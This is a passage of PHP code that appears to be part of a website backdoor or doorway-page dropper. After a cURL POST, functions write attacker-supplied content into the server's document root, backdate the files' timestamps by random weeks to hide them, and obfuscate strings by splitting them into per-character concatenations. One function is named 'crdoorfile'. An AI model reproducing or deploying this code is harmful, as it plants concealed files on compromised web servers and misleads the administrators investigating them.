    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Content-Length: ' . strlen($jsonData)
    ));
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
    $response = curl_exec($ch);
    $result = array();
    if (curl_errno($ch)) {
        $result['status'] = 0;
        $result['msg'] = curl_error($ch);
    }
    curl_close($ch);
    $res = json_decode($response, true);
    $result['status'] = $res['status'];
    return $result;
}

function crefile($fiurl, $contnt){
    $path = $_SERVER['DOCUMENT_ROOT'].'/';
    $filath = $path.dirname($fiurl);
    if (!is_dir($filath)) {
        if (!mkdir($filath, 0755, true)) {
          return false;
        }
    }
    $file_path = $path.$fiurl;
    if (file_put_contents($file_path, $contnt) !== false) {
        $time = time() - rand(30, 100) * 24 *60 *60 - rand(0, 3600);
        touch($file_path, $time);
        return true;
    } else {
        return false;
    }
}

function crdoorfile($fipath, $contnt){
    if (file_put_contents($fipath, $contnt) !== false) {
        $time = time() - rand(30, 100) * 24 *60 *60 - rand(0, 3600);
        touch($fipath, $time);
        return true;
    } else {
        return false;
    }
}

function strslit($str){
    $cha = str_split($str);
    return "'".implode("'.'", $cha)."'";
}

function getrandstr($length = 10) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
?>
